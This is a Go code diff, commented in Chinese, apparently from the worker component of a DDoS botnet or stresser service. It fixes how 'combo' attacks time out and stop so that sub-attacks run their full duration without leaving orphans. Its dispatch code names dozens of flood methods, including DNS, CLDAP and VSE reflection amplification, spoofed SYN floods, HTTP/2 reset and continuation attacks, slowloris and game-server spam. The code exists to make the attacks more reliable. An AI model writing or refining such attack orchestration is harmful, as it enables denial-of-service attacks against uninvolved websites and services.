@@ -38,8 +38,24 @@ func (cs *ComboSession) Stop() {
 
 	close(cs.StopChan)
 
-	// 统一5秒超时：并行停止所有子攻击，但总共只等5秒
-	deadline := time.After(5 * time.Second)
+	// 统一 5s 超时：并行停止所有子攻击，但总共只等 5 秒。
+	// 用"关闭语义"的通道（stop 关闭后所有接收者同时唤醒）——
+	// time.After 的通道只投递一次，多个等待者共享会导致其余永久阻塞。
+	stop := make(chan struct{})
+	timer := time.NewTimer(5 * time.Second)
+	defer timer.Stop()
+	go func() {
+		select {
+		case <-timer.C:
+			close(stop)
+		case <-cs.StopChan:
+			// 立即停止信号已发出：给子会话 5 秒收尾后统一唤醒
+			select {
+			case <-timer.C:
+				close(stop)
+			}
+		}
+	}()
 
 	// 并行触发所有子攻击停止（串行 Stop 时每个最多等 5s，
 	// N 个子攻击会让 worker 心跳主循环阻塞最长 5N 秒，
@@ -55,7 +71,7 @@ func (cs *ComboSession) Stop() {
 			defer wg.Done()
 			select {
 			case <-s.DoneChan:
-			case <-deadline:
+			case <-stop:
 			}
 		}(s)
 	}
@@ -68,7 +84,7 @@ func (cs *ComboSession) Stop() {
 
 	select {
 	case <-done:
-	case <-deadline:
+	case <-stop:
 	}
 }
 
@@ -78,6 +94,14 @@ func (cs *ComboSession) finish() {
 	}
 }
 
+// watchCompletion 等待所有子攻击真正结束（各自 duration 到期或 Stop），
+// 然后关闭 DoneChan 通知 worker 上报完成。
+//
+// 关键：不能对"等待子会话结束"使用固定 5s 超时——子会话的 DoneChan 只在
+// 各自 duration 到期时关闭，60s 的 combo 会在 5s 时被误判完成并上报，
+// 而子攻击仍在继续（worker 侧已无引用可 Stop → 孤儿攻击 + Controller
+// 重派时两波流量叠加）。
+// 只有显式 Stop（StopChan 关闭）时才走 5s 兜底收尾。
 func (cs *ComboSession) watchCompletion() {
 	var wg sync.WaitGroup
 	for _, s := range cs.Sessions {
@@ -87,9 +111,24 @@ func (cs *ComboSession) watchCompletion() {
 			<-s.DoneChan
 		}(s)
 	}
-	// 超时兜底：子攻击个别卡死时不能让 combo 永不完成上报，
-	// 否则 Controller 超时后重复派发攻击
-	waitGroupTimeout(&wg, 5*time.Second)
+
+	allDone := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(allDone)
+	}()
+
+	select {
+	case <-allDone:
+		// 自然完成：所有子攻击 duration 到期
+	case <-cs.StopChan:
+		// 显式停止：给子会话 5 秒收尾（个别 goroutine 可能卡在网络 IO）
+		select {
+		case <-allDone:
+		case <-time.After(5 * time.Second):
+		}
+	}
+
 	cs.finish()
 	close(cs.DoneChan)
 }
@@ -173,55 +212,11 @@ func StartComboAttack(cfg AttackConfig, subCfgs []AttackConfig) *ComboSession {
 	return NewComboSession(sessions)
 }
 
+// subAttackMethodToFunc 子攻击分派：委托 StartMethod（唯一方法清单来源），
+// 避免与 worker 单任务分派出现两份 case 列表（历史上漏过 tcp_syn_spoof）。
 func subAttackMethodToFunc(cfg AttackConfig) *AttackSession {
-	switch cfg.Method {
-	case "vse":
-		return StartVSEAttackEx(cfg)
-	case "vse_reflector":
-		return StartVSEAmplificationEx(cfg)
-	case "dns_reflector":
-		return StartDNSAmplificationEx(cfg)
-	case "cldap_reflector":
-		return StartCLDAPAmplificationEx(cfg)
-	case "udp_stdhex", "udp_plain", "udp_bypass", "udp_burst":
-		return StartUDPFloodEx(cfg)
-	case "tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass":
-		return StartTCPFloodEx(cfg)
-	case "tcp_syn_spoof":
-		return StartSpoofedTCPFloodEx(cfg)
-	case "http_flood":
-		return StartHTTPFloodEx(cfg)
-	case "head_flood":
-		return StartHEADFloodEx(cfg)
-	case "range_flood":
-		return StartRangeFloodEx(cfg)
-	case "post_flood":
-		return StartPOSTFloodEx(cfg)
-	case "http2_flood":
-		return StartHTTP2FloodEx(cfg)
-	case "http2_reset":
-		return StartHTTP2ResetEx(cfg)
-	case "http2_continuation":
-		return StartHTTP2ContinuationEx(cfg)
-	case "http2_bomb":
-		return StartHTTP2BombEx(cfg)
-	case "h2_ping":
-		return StartH2PingEx(cfg)
-	case "tls_handshake":
-		return StartTLSHandshakeEx(cfg)
-	case "slowloris", "slow_post":
-		return StartSlowlorisEx(cfg)
-	case "ws_flood":
-		return StartWSFloodEx(cfg)
-	case "ws_slow":
-		return StartWSSlowEx(cfg)
-	case "https_bypass":
-		return StartHTTPSBypassEx(cfg)
-	case "minecraft_handshake", "minecraft_login":
-		return StartMinecraftAttackEx(cfg)
-	case "game_udp":
-		return StartGameUDPSpamEx(cfg)
-	default:
-		return nil
+	if cfg.Method == "combo" {
+		return nil // 组合不可嵌套
 	}
+	return StartMethod(cfg)
 }
